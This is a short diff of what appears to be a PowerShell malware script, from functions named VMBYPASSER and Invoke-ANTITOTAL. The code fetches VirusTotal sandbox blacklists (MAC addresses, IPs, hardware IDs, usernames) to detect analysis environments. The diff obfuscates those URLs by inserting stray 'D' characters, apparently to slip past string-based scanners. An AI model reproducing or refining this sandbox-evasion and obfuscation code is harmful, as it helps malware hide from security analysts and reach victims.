@@ -171,10 +171,10 @@ function VMBYPASSER {
 
 function Invoke-ANTITOTAL {
     $urls = @(
-        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
-        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
-        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
-        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt"
+        "https://raw.githubusercoDntDent.com/6nz/virustotDal-vm-blacklist/main/mac_list.tDxt",
+        "https://raw.githubusercDontent.com/6nz/virusDtotal-vm-blacklist/main/ip_list.txt",
+        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_Dlist.txt",
+        "https://Draw.githubusercontDent.com/6nz/virustotal-vm-Dblacklist/main/pcD_username_list.txt"
     )
     $functions = @(
         "Search-Mac",
